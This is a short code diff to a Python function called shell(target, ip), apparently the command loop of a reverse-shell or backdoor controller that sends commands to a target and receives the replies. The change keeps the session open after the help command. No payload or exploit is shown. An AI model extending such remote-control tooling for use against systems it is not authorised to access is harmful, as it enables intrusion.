@@ -91,7 +91,7 @@ def shell(target, ip):
                 break
             elif command == "help":
                 show_help()
-                break
+                continue
             elif command.startswith("cd"):
                 response = reliable_recv(target)
                 print(response)
